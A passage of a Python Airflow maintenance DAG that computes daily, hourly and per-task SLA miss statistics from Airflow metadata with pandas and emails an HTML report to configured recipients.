\"task_id\"]).size().to_frame(name=\"total_count\").sort_values(\"total_count\",\n                                                                                        ascending=False).reset_index())\n    return df\n\n\ndef sla_run_counts_df(input_df, timeframe):\n    \"\"\"Filters the sla_run_detail dataframe between the current date and the timeframe mentioned\n\n    Args:\n        input_df (dataframe): base SLA run table\n\n    Returns:\n        dataframe: missed SLAs within provided timeframe\n    \"\"\"\n    tf = input_df[input_df[\"start_date\"].between(timeframe, today)]\n    return tf\n\n\ndef sla_daily_miss(sla_run_detail):\n    \"\"\"SLA miss table which gives us details about the date, SLA miss % on that date and top DAG violators for the long timeframe.\n\n    Args:\n        sla_run_detail (dataframe): Table consiting of details of all the dag runs that happened\n\n    Returns:\n        dataframe: sla_daily_miss output dataframe\n    \"\"\"\n    try:\n\n        sla_pastweek_run_count_df = sla_run_detail[sla_run_detail[\"start_date\"].between(\n            long_timeframe_start_date, today)]\n\n        daily_sla_miss_count = sla_run_detail[sla_run_detail[\"duration\"] > sla_run_detail[\"sla\"]][\n            sla_run_detail[\"start_date\"].between(long_timeframe_start_date, today)].sort_values([\"start_date\"])\n\n        daily_sla_miss_count_datewise = (daily_sla_miss_count.groupby(\n            [\"start_dt\"]).size().to_frame(name=\"slamiss_count_datewise\").reset_index())\n        daily_sla_count_df = (daily_sla_miss_count.groupby([\"start_dt\", \"dag_id\",\n                                                            \"task_id\"]).size().to_frame(name=\"size\").reset_index())\n        daily_sla_totalcount_datewise = (sla_pastweek_run_count_df.groupby(\n            [\"start_dt\"]).size().to_frame(name=\"total_count\").sort_values(\"start_dt\", ascending=False).reset_index())\n        daily_sla_totalcount_datewise_taskwise = (sla_pastweek_run_count_df.groupby(\n            [\"start_dt\", \"dag_id\",\n             \"task_id\"]).size().to_frame(name=\"totalcount\").sort_values(\"start_dt\", ascending=False).reset_index())\n        daily_sla_miss_pct_df = pd.merge(daily_sla_miss_count_datewise, daily_sla_totalcount_datewise, on=[\"start_dt\"])\n        daily_sla_miss_pct_df[\"sla_miss_percent\"] = (daily_sla_miss_pct_df[\"slamiss_count_datewise\"] * 100 /\n                                                     daily_sla_miss_pct_df[\"total_count\"]).round(2)\n        daily_sla_miss_pct_df[\"sla_miss_percent(missed_tasks/total_tasks)\"] = daily_sla_miss_pct_df.apply(\n            lambda x: \"%s%s(%s/%s)\" % (x[\"sla_miss_percent\"], \"% \", x[\"slamiss_count_datewise\"], x[\"total_count\"]),\n            axis=1,\n        )\n\n        daily_sla_miss_percent = daily_sla_miss_pct_df.filter(\n            [\"start_dt\", \"sla_miss_percent(missed_tasks/total_tasks)\"], axis=1)\n        daily_sla_miss_df_pct1 = pd.merge(\n            daily_sla_count_df,\n            daily_sla_totalcount_datewise_taskwise,\n            on=[\"start_dt\", \"dag_id\", \"task_id\"],\n        )\n        daily_sla_miss_df_pct1[\"pct_violator\"] = (daily_sla_miss_df_pct1[\"size\"] * 100 /\n                                                  daily_sla_miss_df_pct1[\"totalcount\"]).round(2)\n        daily_sla_miss_df_pct_kpi = (daily_sla_miss_df_pct1.sort_values(\"pct_violator\",\n                                                                        ascending=False).groupby(\"start_dt\",\n                                                                                                 sort=False).head(1))\n\n        daily_sla_miss_df_pct_kpi[\"top_pct_violator\"] = daily_sla_miss_df_pct_kpi.apply(\n            lambda x: \"%s: %s (%s%s\" % (x[\"dag_id\"], x[\"task_id\"], x[\"pct_violator\"], \"%)\"),\n            axis=1,\n        )\n\n        daily_slamiss_percent_violator = daily_sla_miss_df_pct_kpi.filter([\"start_dt\", \"top_pct_violator\"], axis=1)\n        daily_slamiss_df_absolute_kpi = (daily_sla_miss_df_pct1.sort_values(\"size\", ascending=False).groupby(\n            \"start_dt\", sort=False).head(1))\n\n        daily_slamiss_df_absolute_kpi[\"top_absolute_violator\"] = daily_slamiss_df_absolute_kpi.apply(\n            lambda x: \"%s: %s (%s/%s)\" % (x[\"dag_id\"], x[\"task_id\"], x[\"size\"], x[\"totalcount\"]),\n            axis=1,\n        )\n\n        daily_slamiss_absolute_violator = daily_slamiss_df_absolute_kpi.filter([\"start_dt\", \"top_absolute_violator\"],\n                                                                               axis=1)\n        daily_slamiss_pct_last7days = pd.merge(\n            pd.merge(daily_sla_miss_percent, daily_slamiss_percent_violator, on=\"start_dt\"),\n            daily_slamiss_absolute_violator,\n            on=\"start_dt\",\n        ).sort_values(\"start_dt\", ascending=False)\n\n        daily_slamiss_pct_last7days = daily_slamiss_pct_last7days.rename(\n            columns={\n                \"top_pct_violator\": \"Top Violator (%)\",\n                \"top_absolute_violator\": \"Top Violator (absolute)\",\n                \"start_dt\": \"Date\",\n                \"sla_miss_percent(missed_tasks/total_tasks)\": \"SLA Miss % (Missed/Total Tasks)\",\n            })\n        return daily_slamiss_pct_last7days\n    except:\n        daily_slamiss_pct_last7days = pd.DataFrame(\n            columns=[\"Date\", \"SLA Miss % (Missed/Total Tasks)\", \"Top Violator (%)\", \"Top Violator (absolute)\"])\n        return daily_slamiss_pct_last7days\n\n\ndef sla_hourly_miss(sla_run_detail):\n    \"\"\"Generate hourly SLA miss table giving us details about the hour, SLA miss % for that hour, top DAG violators\n    and the longest running task and avg task queue time for the given short timeframe.\n\n    Args:\n        sla_run_detail (dataframe): Base table consiting of details of all the dag runs that happened\n\n    Returns:\n        datframe, list: observations_hourly_reccomendations list and  sla_miss_percent_past_day_hourly dataframe\n    \"\"\"\n    try:\n\n        sla_miss_count_past_day = sla_run_detail[sla_run_detail[\"duration\"] > sla_run_detail[\"sla\"]][\n            sla_run_detail[\"start_date\"].between(short_timeframe_start_date, today)]\n\n        sla_miss_count_hourly = (sla_miss_count_past_day.groupby(\n            [\"run_date_hour\"]).size().to_frame(name=\"slamiss_count_hourwise\").reset_index())\n        sla_count_df_past_day_hourly = (sla_miss_count_past_day.groupby([\"run_date_hour\", \"dag_id\", \"task_id\"\n                                                                         ]).size().to_frame(name=\"size\").reset_index())\n        sla_avg_execution_time_taskwise_hourly = (sla_miss_count_past_day.groupby(\n            [\"run_date_hour\", \"dag_id\", \"task_id\"])[\"duration\"].mean().reset_index())\n        sla_avg_execution_time_hourly = (sla_avg_execution_time_taskwise_hourly.sort_values(\n            \"duration\", ascending=False).groupby(\"run_date_hour\", sort=False).head(1))\n\n        sla_pastday_run_count_df = sla_run_detail[sla_run_detail[\"start_date\"].between(\n            short_timeframe_start_date, today)]\n        sla_avg_queue_time_hourly = (sla_pastday_run_count_df.groupby([\"run_date_hour\"\n                                                                       ])[\"task_queue_time\"].mean().reset_index())\n        sla_totalcount_hourly = (sla_pastday_run_count_df.groupby(\n            [\"run_date_hour\"]).size().to_frame(name=\"total_count\").sort_values(\"run_date_hour\",\n                                                                               ascending=False).reset_index())\n        sla_totalcount_taskwise_hourly = (sla_pastday_run_count_df.groupby(\n            [\"run_date_hour\", \"dag_id\",\n             \"task_id\"]).size().to_frame(name=\"totalcount\").sort_values(\"run_date_hour\", ascending=False).reset_index())\n        sla_miss_pct_past_day_hourly = pd.merge(sla_miss_count_hourly, sla_totalcount_hourly, on=[\"run_date_hour\"])\n        sla_miss_pct_past_day_hourly[\"sla_miss_percent\"] = (sla_miss_pct_past_day_hourly[\"slamiss_count_hourwise\"] *\n                                                            100 / sla_miss_pct_past_day_hourly[\"total_count\"]).round(2)\n\n        sla_miss_pct_past_day_hourly[\"sla_miss_percent(missed_tasks/total_tasks)\"] = sla_miss_pct_past_day_hourly.apply(\n            lambda x: \"%s%s(%s/%s)\" % (\n                x[\"sla_miss_percent\"].astype(int),\n                \"% \",\n                x[\"slamiss_count_hourwise\"].astype(int),\n                x[\"total_count\"].astype(int),\n            ),\n            axis=1,\n        )\n\n        sla_highest_sla_miss_hour = (sla_miss_pct_past_day_hourly[[\"run_date_hour\", \"sla_miss_percent\"\n                                                                   ]].sort_values(\"sla_miss_percent\",\n                                                                                  ascending=False).head(1))\n        sla_highest_tasks_hour = (sla_miss_pct_past_day_hourly[[\"run_date_hour\",\n                                                                \"total_count\"]].sort_values(\"total_count\",\n                                                                                            ascending=False).head(1))\n\n        sla_miss_percent_past_day = sla_miss_pct_past_day_hourly.filter(\n            [\"run_date_hour\", \"sla_miss_percent(missed_tasks/total_tasks)\"], axis=1)\n\n        sla_miss_temp_df_pct1_past_day = pd.merge(\n            sla_count_df_past_day_hourly,\n            sla_totalcount_taskwise_hourly,\n            on=[\"run_date_hour\", \"dag_id\", \"task_id\"],\n        )\n\n        sla_miss_temp_df_pct1_past_day[\"pct_violator\"] = (sla_miss_temp_df_pct1_past_day[\"size\"] * 100 /\n                                                          sla_miss_temp_df_pct1_past_day[\"totalcount\"]).round(2)\n        sla_miss_pct_past_day_hourly = (sla_miss_temp_df_pct1_past_day.sort_values(\n            \"pct_violator\", ascending=False).groupby(\"run_date_hour\", sort=False).head(1))\n\n        sla_miss_pct_past_day_hourly[\"top_pct_violator\"] = sla_miss_pct_past_day_hourly.apply(\n            lambda x: \"%s: %s (%s%s\" % (x[\"dag_id\"], x[\"task_id\"], x[\"pct_violator\"], \"%)\"),\n            axis=1,\n        )\n\n        sla_miss_percent_violator_past_day_hourly = sla_miss_pct_past_day_hourly.filter(\n            [\"run_date_hour\", \"top_pct_violator\"], axis=1)\n        sla_miss_absolute_kpi_past_day_hourly = (sla_miss_temp_df_pct1_past_day.sort_values(\n            \"size\", ascending=False).groupby(\"run_date_hour\", sort=False).head(1))\n        sla_miss_absolute_kpi_past_day_hourly[\"top_absolute_violator\"] = sla_miss_absolute_kpi_past_day_hourly.apply(\n            lambda x: \"%s: %s (%s/%s)\" % (x[\"dag_id\"], x[\"task_id\"], x[\"size\"], x[\"totalcount\"]),\n            axis=1,\n        )\n\n        sla_miss_absolute_violator_past_day_hourly = sla_miss_absolute_kpi_past_day_hourly.filter(\n            [\"run_date_hour\", \"top_absolute_violator\"], axis=1)\n        slamiss_pct_exectime = pd.merge(\n            pd.merge(\n                sla_miss_percent_past_day,\n                sla_miss_percent_violator_past_day_hourly,\n                on=\"run_date_hour\",\n            ),\n            sla_miss_absolute_violator_past_day_hourly,\n            on=\"run_date_hour\",\n        ).sort_values(\"run_date_hour\", ascending=False)\n\n        sla_avg_execution_time_hourly[\"duration\"] = (\n            sla_avg_execution_time_hourly[\"duration\"].round(0).astype(int).astype(str))\n        sla_avg_execution_time_hourly[\"longest_running_task\"] = sla_avg_execution_time_hourly.apply(\n            lambda x: \"%s: %s (%ss)\" % (x[\"dag_id\"], x[\"task_id\"], x[\"duration\"]), axis=1)\n\n        sla_longest_running_task_hourly = sla_avg_execution_time_hourly.filter(\n            [\"run_date_hour\", \"longest_running_task\"], axis=1)\n\n        sla_miss_pct = pd.merge(slamiss_pct_exectime, sla_longest_running_task_hourly, on=[\"run_date_hour\"])\n        sla_miss_percent_past_day_hourly = pd.merge(sla_miss_pct, sla_avg_queue_time_hourly, on=[\"run_date_hour\"])\n        sla_miss_percent_past_day_hourly[\"task_queue_time\"] = (\n            sla_miss_percent_past_day_hourly[\"task_queue_time\"].round(0).astype(int).apply(str))\n        sla_longest_queue_time_hourly = (sla_miss_percent_past_day_hourly[[\"run_date_hour\", \"task_queue_time\"\n                                                                           ]].sort_values(\"task_queue_time\",\n                                                                                          ascending=False).head(1))\n\n        sla_miss_percent_past_day_hourly.rename(\n            columns={\n                \"task_queue_time\": \"Average Task Queue Time (s)\",\n                \"longest_running_task\": \"Longest Running Task\",\n                \"top_pct_violator\": \"Top Violator (%)\",\n                \"top_absolute_violator\": \"Top Violator (absolute)\",\n                \"run_date_hour\": \"Hour\",\n                \"sla_miss_percent(missed_tasks/total_tasks)\": \"SLA miss % (Missed/Total Tasks)\",\n            },\n            inplace=True,\n        )\n\n        obs1_hourlytrend = \"Hour \" + (sla_highest_sla_miss_hour[\"run_date_hour\"].apply(str) +\n                                      \" had the highest percentage of SLA misses\").to_string(index=False)\n        obs2_hourlytrend = \"Hour \" + (\n            sla_longest_queue_time_hourly[\"run_date_hour\"].apply(str) + \" had the longest average queue time (\" +\n            sla_longest_queue_time_hourly[\"task_queue_time\"].apply(str) + \" seconds)\").to_string(index=False)\n        obs3_hourlytrend = \"Hour \" + (sla_highest_tasks_hour[\"run_date_hour\"].apply(str) +\n                                      \" had the most tasks running\").to_string(index=False)\n\n        observations_hourly_reccomendations = [obs1_hourlytrend, obs2_hourlytrend, obs3_hourlytrend]\n        return observations_hourly_reccomendations, sla_miss_percent_past_day_hourly\n    except:\n        sla_miss_percent_past_day_hourly = pd.DataFrame(columns=[\n            \"SLA Miss % (Missed/Total Tasks)\",\n            \"Top Violator (%)\",\n            \"Top Violator (absolute)\",\n            \"Longest Running Task\",\n            \"Hour\",\n            \"Average Task Queue Time (seconds)\",\n        ])\n        observations_hourly_reccomendations = \"\"\n        return observations_hourly_reccomendations, sla_miss_percent_past_day_hourly\n\n\ndef sla_dag_miss(sla_run_detail, serialized_dags_slas):\n    \"\"\"\n    Generate SLA dag miss table giving us details about the SLA miss % for the given timeframes along with the average execution time and\n    reccomendations for weekly observations.\n\n    Args:\n        sla_run_detail (dataframe): Base table consiting of details of all the dag runs that happened\n        serialized_dags_slas (dataframe): table consisting of all the dag details\n\n    Returns:\n        2 lists consisting of sla_daily_miss and sla_dag_miss reccomendations and 1 dataframe consisting of sla_dag_miss reccomendation\n    \"\"\"\n    try:\n\n        dag_sla_count_df_weekprior, dag_sla_count_df_weekprior_avgduration = sla_miss_count_df(\n            sla_run_detail, long_timeframe_start_date)\n        dag_sla_count_df_threedayprior, dag_sla_count_df_threedayprior_avgduration = sla_miss_count_df(\n            sla_run_detail, medium_timeframe_start_date)\n        dag_sla_count_df_onedayprior, dag_sla_count_df_onedayprior_avgduration = sla_miss_count_df(\n            sla_run_detail, short_timeframe_start_date)\n\n        dag_sla_run_count_week_prior = sla_run_counts_df(sla_run_detail, long_timeframe_start_date)\n        dag_sla_run_count_three_day_prior = sla_run_counts_df(sla_run_detail, medium_timeframe_start_date)\n        dag_sla_run_count_one_day_prior = sla_run_counts_df(sla_run_detail, short_timeframe_start_date)\n\n        dag_sla_run_count_week_prior_success = (\n            dag_sla_run_count_week_prior[dag_sla_run_count_week_prior[\"state\"] == \"success\"].groupby(\n                [\"dag_id\", \"task_id\"]).size().to_frame(name=\"success_count\").reset_index())\n        dag_sla_run_count_week_prior_failure = (\n            dag_sla_run_count_week_prior[dag_sla_run_count_week_prior[\"state\"] == \"failed\"].groupby(\n                [\"dag_id\", \"task_id\"]).size().to_frame(name=\"failure_count\").reset_index())\n\n        dag_sla_run_count_week_prior_success_duration_stats = (\n            dag_sla_run_count_week_prior[dag_sla_run_count_week_prior[\"state\"] == \"success\"].groupby(\n                [\"dag_id\", \"task_id\"])[\"duration\"].agg([\"mean\", \"min\", \"max\"]).reset_index())\n        dag_sla_run_count_week_prior_failure_duration_stats = (\n            dag_sla_run_count_week_prior[dag_sla_run_count_week_prior[\"state\"] == \"failed\"].groupby(\n                [\"dag_id\", \"task_id\"])[\"duration\"].agg([\"mean\", \"min\", \"max\"]).reset_index())\n\n        dag_sla_totalcount_week_prior = sla_total_counts_df(dag_sla_run_count_week_prior)\n        dag_sla_totalcount_three_day_prior = sla_total_counts_df(dag_sla_run_count_three_day_prior)\n        dag_sla_totalcount_one_day_prior = sla_total_counts_df(dag_sla_run_count_one_day_prior)\n\n        dag_obs5_sladpercent_weekprior = sla_miss_pct(dag_sla_count_df_weekprior, dag_sla_totalcount_week_prior)\n        dag_obs6_sladpercent_threedayprior = sla_miss_pct(dag_sla_count_df_threedayprior,\n                                                          dag_sla_totalcount_three_day_prior)\n        dag_obs7_sladpercent_onedayprior = sla_miss_pct(dag_sla_count_df_onedayprior, dag_sla_totalcount_one_day_prior)\n\n        dag_obs7_sladetailed_week = f'In the past {str(LONG_TIMEFRAME_IN_DAYS)} days, {dag_obs5_sladpercent_weekprior}% of the tasks have missed their SLA'\n        dag_obs6_sladetailed_threeday = f'In the past {str(MEDIUM_TIMEFRAME_IN_DAYS)} days, {dag_obs6_sladpercent_threedayprior}% of the tasks have missed their SLA'\n        dag_obs5_sladetailed_oneday = f'In the past {str(SHORT_TIMEFRAME_IN_DAYS)} days, {dag_obs7_sladpercent_onedayprior}% of the tasks have missed their SLA'\n\n        dag_sla_miss_pct_df_week_prior = pd.merge(\n            pd.merge(dag_sla_count_df_weekprior, dag_sla_totalcount_week_prior, on=[\"dag_id\", \"task_id\"]),\n            dag_sla_count_df_weekprior_avgduration,\n            on=[\"dag_id\", \"task_id\"],\n        )\n        dag_sla_miss_pct_df_threeday_prior = pd.merge(\n            pd.merge(\n                dag_sla_count_df_threedayprior,\n                dag_sla_totalcount_three_day_prior,\n                on=[\"dag_id\", \"task_id\"],\n            ),\n            dag_sla_count_df_threedayprior_avgduration,\n            on=[\"dag_id\", \"task_id\"],\n        )\n        dag_sla_miss_pct_df_oneday_prior = pd.merge(\n            pd.merge(\n                dag_sla_count_df_onedayprior,\n                dag_sla_totalcount_one_day_prior,\n                on=[\"dag_id\", \"task_id\"],\n            ),\n            dag_sla_count_df_onedayprior_avgduration,\n            on=[\"dag_id\", \"task_id\"],\n        )\n\n        dag_sla_miss_pct_df_week_prior[\"sla_miss_percent_week\"] = (\n            dag_sla_miss_pct_df_week_prior[\"size\"] * 100 / dag_sla_miss_pct_df_week_prior[\"total_count\"]).round(2)\n        dag_sla_miss_pct_df_threeday_prior[\"sla_miss_percent_three_day\"] = (\n            dag_sla_miss_pct_df_threeday_prior[\"size\"] * 100 /\n            dag_sla_miss_pct_df_threeday_prior[\"total_count\"]).round(2)\n        dag_sla_miss_pct_df_oneday_prior[\"sla_miss_percent_one_day\"] = (\n            dag_sla_miss_pct_df_oneday_prior[\"size\"] * 100 / dag_sla_miss_pct_df_oneday_prior[\"total_count\"]).round(2)\n\n        dag_sla_miss_pct_df1 = dag_sla_miss_pct_df_week_prior.merge(dag_sla_miss_pct_df_threeday_prior,\n                                                                    on=[\"dag_id\", \"task_id\"],\n                                                                    how=\"left\")\n        dag_sla_miss_pct_df2 = dag_sla_miss_pct_df1.merge(dag_sla_miss_pct_df_oneday_prior,\n                                                          on=[\"dag_id\", \"task_id\"],\n                                                          how=\"left\")\n        dag_sla_miss_pct_df3 = dag_sla_miss_pct_df2.merge(serialized_dags_slas, on=[\"dag_id\", \"task_id\"], how=\"left\")\n\n        dag_sla_miss_pct_detailed = dag_sla_miss_pct_df3.filter(\n            [\n                \"dag_id\",\n                \"task_id\",\n                \"sla\",\n                \"sla_miss_percent_week\",\n                \"duration_x\",\n                \"sla_miss_percent_three_day\",\n                \"duration_y\",\n                \"sla_miss_percent_one_day\",\n                \"duration\",\n            ],\n            axis=1,\n        )\n\n        float_column_names = dag_sla_miss_pct_detailed.select_dtypes(float).columns\n        dag_sla_miss_pct_detailed[float_column_names] = dag_sla_miss_pct_detailed[float_column_names].fillna(0)\n\n        round_int_column_names = [\"duration_x\", \"duration_y\", \"duration\"]\n        dag_sla_miss_pct_detailed[round_int_column_names] = dag_sla_miss_pct_detailed[round_int_column_names].round(\n            0).astype(int)\n        dag_sla_miss_pct_detailed[\"sla\"] = dag_sla_miss_pct_detailed[\"sla\"].astype(int)\n        dag_sla_miss_pct_detailed[\"Dag: Task\"] = (dag_sla_miss_pct_detailed[\"dag_id\"].apply(str) + \": \" +\n                                                  dag_sla_miss_pct_detailed[\"task_id\"].apply(str))\n\n        short_timeframe_col_name = f'{SHORT_TIMEFRAME_IN_DAYS}-day SLA Miss % (avg execution time)'\n        medium_timeframe_col_name = f'{MEDIUM_TIMEFRAME_IN_DAYS}-day SLA Miss % (avg execution time)'\n        long_timeframe_col_name = f'{LONG_TIMEFRAME_IN_DAYS}-day SLA Miss % (avg execution time)'\n\n        dag_sla_miss_pct_detailed[short_timeframe_col_name] = (\n            dag_sla_miss_pct_detailed[\"sla_miss_percent_one_day\"].apply(str) + \"% (\" +\n            dag_sla_miss_pct_detailed[\"duration\"].apply(str) + \"s)\")\n\n        dag_sla_miss_pct_detailed[medium_timeframe_col_name] = (\n            dag_sla_miss_pct_detailed[\"sla_miss_percent_three_day\"].apply(str) + \"% (\" +\n            dag_sla_miss_pct_detailed[\"duration_y\"].apply(str) + \"s)\")\n\n        dag_sla_miss_pct_detailed[long_timeframe_col_name] = (\n            dag_sla_miss_pct_detailed[\"sla_miss_percent_week\"].apply(str) + \"% (\" +\n            dag_sla_miss_pct_detailed[\"duration_x\"].apply(str) + \"s)\")\n\n        dag_sla_miss_pct_filtered = dag_sla_miss_pct_detailed.filter(\n            [\n                \"Dag: Task\",\n                \"sla\",\n                short_timeframe_col_name,\n                medium_timeframe_col_name,\n                long_timeframe_col_name,\n            ],\n            axis=1,\n        ).sort_values(by=[long_timeframe_col_name], ascending=False)\n\n        dag_sla_miss_pct_filtered.rename(columns={\"sla\": \"Current SLA (s)\"}, inplace=True)\n\n        dag_sla_miss_pct_recc1 = dag_sla_miss_pct_detailed.nlargest(3, [\"sla_miss_percent_week\"]).fillna(0)\n        dag_sla_miss_pct_recc2 = dag_sla_miss_pct_recc1.filter(\n            [\"dag_id\", \"task_id\", \"sla\", \"sla_miss_percent_week\", \"Dag: Task\"], axis=1).fillna(0)\n        dag_sla_miss_pct_df4_recc3 = pd.merge(\n            pd.merge(\n                dag_sla_miss_pct_recc2,\n                dag_sla_run_count_week_prior_success,\n                on=[\"dag_id\", \"task_id\"],\n            ),\n            dag_sla_run_count_week_prior_failure,\n            on=[\"dag_id\", \"task_id\"],\n            how=\"left\",\n        ).fillna(0)\n        dag_sla_miss_pct_df4_recc4 = pd.merge(\n            pd.merge(\n                dag_sla_miss_pct_df4_recc3,\n                dag_sla_run_count_week_prior_success_duration_stats,\n                on=[\"dag_id\", \"task_id\"],\n                how=\"left\",\n            ),\n            dag_sla_run_count_week_prior_failure_duration_stats,\n            on=[\"dag_id\", \"task_id\"],\n            how=\"left\",\n        ).fillna(0)\n        dag_sla_miss_pct_df4_recc4[\"Recommendations\"] = (\n            dag_sla_miss_pct_df4_recc4[\"Dag: Task\"].apply(str) + \" - Of the \" +\n            dag_sla_miss_pct_df4_recc4[\"sla_miss_percent_week\"].apply(str) +\n            \"% of the tasks that missed their SLA of \" + dag_sla_miss_pct_df4_recc4[\"sla\"].apply(str) + \" seconds, \" +\n            dag_sla_miss_pct_df4_recc4[\"success_count\"].astype(int).apply(str) + \" succeeded (min: \" +\n            dag_sla_miss_pct_df4_recc4[\"min_x\"].round(0).astype(int).apply(str) + \"s, avg: \" +\n            dag_sla_miss_pct_df4_recc4[\"mean_x\"].round(0).astype(int).apply(str) + \"s, max: \" +\n            dag_sla_miss_pct_df4_recc4[\"max_x\"].round(0).astype(int).apply(str) + \"s) & \" +\n            dag_sla_miss_pct_df4_recc4[\"failure_count\"].astype(int).apply(str) + \" failed (min: \" +\n            dag_sla_miss_pct_df4_recc4[\"min_y\"].round(0).astype(int).apply(str) + \"s, avg: \" +\n            dag_sla_miss_pct_df4_recc4[\"mean_y\"].round(0).astype(int).apply(str) + \"s, max: \" +\n            dag_sla_miss_pct_df4_recc4[\"max_y\"].round(0).fillna(0).astype(int).apply(str) + \"s)\")\n\n        daily_weeklytrend_observations_loop = [\n            dag_obs5_sladetailed_oneday,\n            dag_obs6_sladetailed_threeday,\n            dag_obs7_sladetailed_week,\n        ]\n\n        dag_sla_miss_trend = dag_sla_miss_pct_df4_recc4[\"Recommendations\"].tolist()\n\n        return daily_weeklytrend_observations_loop, dag_sla_miss_trend, dag_sla_miss_pct_filtered\n    except:\n        short_timeframe_col_name = f'{SHORT_TIMEFRAME_IN_DAYS}-Day SLA miss % (avg execution time)'\n        medium_timeframe_col_name = f'{MEDIUM_TIMEFRAME_IN_DAYS}-Day SLA miss % (avg execution time)'\n        long_timeframe_col_name = f'{LONG_TIMEFRAME_IN_DAYS}-Day SLA miss % (avg execution time)'\n        daily_weeklytrend_observations_loop = \"\"\n        dag_sla_miss_trend = \"\"\n        dag_sla_miss_pct_filtered = pd.DataFrame(columns=[\n            \"Dag: Task\",\n            \"Current SLA\",\n            short_timeframe_col_name,\n            medium_timeframe_col_name,\n            long_timeframe_col_name,\n        ])\n        return daily_weeklytrend_observations_loop, dag_sla_miss_trend, dag_sla_miss_pct_filtered\n\n\ndef sla_miss_report():\n    \"\"\"Embed all the resultant output datframes within html format and send the email report to the intented recipients.\"\"\"\n\n    sla_run_detail, serialized_dags_slas = retrieve_metadata()\n    daily_slamiss_pct_last7days = sla_daily_miss(sla_run_detail)\n    observations_hourly_reccomendations, sla_miss_percent_past_day_hourly = sla_hourly_miss(sla_run_detail)\n    daily_weeklytrend_observations_loop, dag_sla_miss_trend, dag_sla_miss_pct_filtered = sla_dag_miss(\n        sla_run_detail, serialized_dags_slas)\n\n    new_line = '\\n'\n    print(f\"\"\"\n------------------- START OF REPORT -------------------\n{EMAIL_SUBJECT}\n\nDaily SLA Misses\n{new_line.join(map(str, daily_weeklytrend_observations_loop))}\n\n{daily_slamiss_pct_last7days.to_markdown(index=False)}\n\nHourly SLA Misses\n{new_line.join(map(str, observations_hourly_reccomendations))}\n\n{sla_miss_percent_past_day_hourly.to_markdown(index=False)}\n\nDAG SLA Misses\n{new_line.join(map(str, dag_sla_miss_trend))}\n\n{dag_sla_miss_pct_filtered.to_markdown(index=False)}\n\n------------------- END OF REPORT -------------------\n    \"\"\")\n\n    daily_weeklytrend_observations_loop = \"\".join([f\"<li>{item}</li>\" for item in daily_weeklytrend_observations_loop])\n    observations_hourly_reccomendations = \"\".join([f\"<li>{item}</li>\" for item in observations_hourly_reccomendations])\n    dag_sla_miss_trend = \"\".join([f\"<li>{item}</li>\" for item in dag_sla_miss_trend])\n\n    short_timeframe_print = f'<b>Short</b>: {SHORT_TIMEFRAME_IN_DAYS}d ({short_timeframe_start_date.strftime(\"%b %d\")} - {(today - timedelta(days=1)).strftime(\"%b %d\")})'\n    medium_timeframe_print = f'<b>Medium</b>: {MEDIUM_TIMEFRAME_IN_DAYS}d ({medium_timeframe_start_date.strftime(\"%b %d\")} - {(today - timedelta(days=1)).strftime(\"%b %d\")})'\n    long_timeframe_print = f'<b>Long</b>: {LONG_TIMEFRAME_IN_DAYS}d ({long_timeframe_start_date.strftime(\"%b %d\")} - {(today - timedelta(days=1)).strftime(\"%b %d\")})'\n    timeframe_prints = f'{short_timeframe_print} | {medium_timeframe_print} | {long_timeframe_print}'\n\n    html_content = f\"\"\"\\\n    <html>\n    <head>\n    <style>\n    table {{\n    font-family: Arial, Helvetica, sans-serif;\n    border-collapse: collapse;\n    width: 100%;\n    }}\n\n    td, th {{\n    border: 1px solid #ddd;\n    padding: 8px;\n    }}\n\n    th {{\n    padding-top: 12px;\n    padding-bottom: 12px;\n    text-align: left;\n    background-color: #154360;\n    color: white;\n    }}\n\n    td {{\n    text-align: left;\n    background-color: #EBF5FB;\n    }}\n    </style>\n    </head>\n    <body>\n    The following timeframes are used to generate this report. To change them, update the [SHORT, MEDIUM, LONG]_TIMEFRAME_IN_DAYS variables in airflow-sla-miss-report.py.\n    <br></br><br></br>\n    {timeframe_prints}\n\n    <h2>Daily SLA Misses</h2>\n    <p>Daily breakdown of SLA misses and the <b>worst offenders</b> over the past {LONG_TIMEFRAME_IN_DAYS} day(s).</p>\n    {daily_weeklytrend_observations_loop}\n    {daily_slamiss_pct_last7days.to_html(index=False)}\n\n\n    <h2>Hourly SLA Misses</h2>\n    <p>Hourly breakdown of tasks missing their SLAs and the worst offenders over the past {SHORT_TIMEFRAME_IN_DAYS} day(s). Useful for identifying <b>scheduling bottlenecks</b>.</p>\n    {observations_hourly_reccomendations}\n    {sla_miss_percent_past_day_hourly.to_html(index=False)}\n\n    <h2>DAG SLA Misses</h2>\n    <p>Task level breakdown showcasing the SLA miss percentage & average execution time over the past {SHORT_TIMEFRAME_IN_DAYS}, {MEDIUM_TIMEFRAME_IN_DAYS}, and {LONG_TIMEFRAME_IN_DAYS} day(s). Useful for <b>identifying trends and updating defined SLAs</b> to meet actual exectution times.</p>\n    {dag_sla_miss_trend}\n    {dag_sla_miss_pct_filtered.to_html(index=False)}\n\n    </body>\n    </html>\n    \"\"\"\n    if EMAIL_ADDRESSES:\n        send_email(to=EMAIL_ADDRESSES, subject=EMAIL_SUBJECT, html_content=html_content)\n\n\ndef no_metadata_found():\n    \"\"\"Stock html email template to send if there is no data present in the base tables\"\"\"\n\n    print(\"No Data Available. Check data is present in the airflow metadata database.\")\n\n    html_content = f\"\"\"\\\n    <html>\n    <body>\n    <h2 style=\"color:red\"><u>No Data Available</u></h2>\n    <p><b>Check data is present in the airflow metadata database.</b></p>\n    </body>\n    </html>\n    \"\"\"\n    if EMAIL_ADDRESSES:\n        send_email(to=EMAIL_ADDRESSES, subject=EMAIL_SUBJECT, html_content=html_content)\n\n\ndefault_args = {\n    'owner': DAG_OWNER,\n    'depends_on_past': False,\n    'email': EMAIL_ADDRESSES,\n    'email_on_failure': True,\n    'email_on_retry': False,\n    'start_date': START_DATE,\n    \"retries\": 1,\n    \"retry_delay\": timedelta(minutes=5),\n}\n\nwith DAG(DAG_ID,\n         default_args=default_args,\n         description=\"DAG generating the SLA miss report\",\n         schedule_interval=SCHEDULE_INTERVAL,\n         start_date=START_DATE,\n         tags=['teamclairvoyant', 'airflow-maintenance-dags']) as dag:\n    sla_miss_report_task = PythonOperator(task_id=\"sla_miss_report\", python_callable=sla_miss_report, dag=dag)\n", "metadata": {"source": "github.com/teamclairvoyant/airflow-maintenance-dags", "file_path": "sla-miss-report/airflow-sla-miss-report.py", "language": "python", "complexity": "complex", "star_count": 1731, "quality_score": 0.8099999999999999, "authority_level": "high", "authentic": true}}
